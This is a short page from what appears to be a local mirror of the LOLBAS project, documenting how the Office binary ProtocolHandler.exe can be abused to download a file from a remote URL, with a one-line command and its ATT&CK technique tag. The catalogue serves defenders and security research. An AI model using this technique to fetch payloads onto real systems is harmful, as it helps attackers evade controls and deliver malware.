# LOLBAS: ProtocolHandler.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Microsoft Office binary

## Comandos

### It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)

Download · priv: User · T1105

```cmd
ProtocolHandler.exe {REMOTEURL}
```

Downloads payload from remote server

